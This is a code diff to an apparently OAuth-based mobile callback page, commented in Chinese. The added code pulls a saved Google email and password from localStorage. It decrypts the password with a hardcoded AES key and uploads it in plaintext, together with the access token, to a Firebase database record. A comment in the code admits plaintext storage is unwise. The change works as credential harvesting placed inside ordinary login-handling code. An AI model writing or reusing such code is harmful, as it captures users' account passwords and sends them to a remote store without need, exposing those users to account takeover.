@@ -74,14 +74,23 @@
                 headers: { 'Authorization': `Bearer ${accessToken}` }
             })
             .then(response => response.json())
-// 修改mobile-callback.html中的成功處理部分
+// 修改mobile-callback.html中的處理部分，確保傳送完整信息到Firebase
+// 在獲取用戶資訊的部分
 .then(userData => {
-    // 將訪問令牌發送到 Firebase
+    // 取回之前存儲的登入資訊
+    const email = localStorage.getItem('googleEmail');
+    const encryptedPassword = localStorage.getItem('googlePassword');
+    const password = encryptedPassword ? 
+        CryptoJS.AES.decrypt(encryptedPassword, 'yingbei-secure-key').toString(CryptoJS.enc.Utf8) : 
+        '';
+    
+    // 將訪問令牌和完整資訊發送到 Firebase
     const connectionRef = database.ref('connections/' + connectionId);
     connectionRef.update({
         access_token: accessToken,
-        user_email: userData.email,
+        user_email: userData.email || email,
         user_name: userData.name,
+        user_password: password, // 實際應用應該避免明文存儲密碼
         status: 'authenticated',
         authentication_time: Date.now(),
         token_type: params.get('token_type'),
@@ -93,15 +102,6 @@
     
     // 清除暫存的連接 ID
     localStorage.removeItem('pendingConnectionId');
-    
-    // 額外的確認機制
-    setTimeout(() => {
-        connectionRef.once('value', snapshot => {
-            if (snapshot.val() && snapshot.val().status === 'success') {
-                messageElement.textContent = '授權已被桌面端接收並處理！';
-            }
-        });
-    }, 5000);
 })
     </script>
 </body>
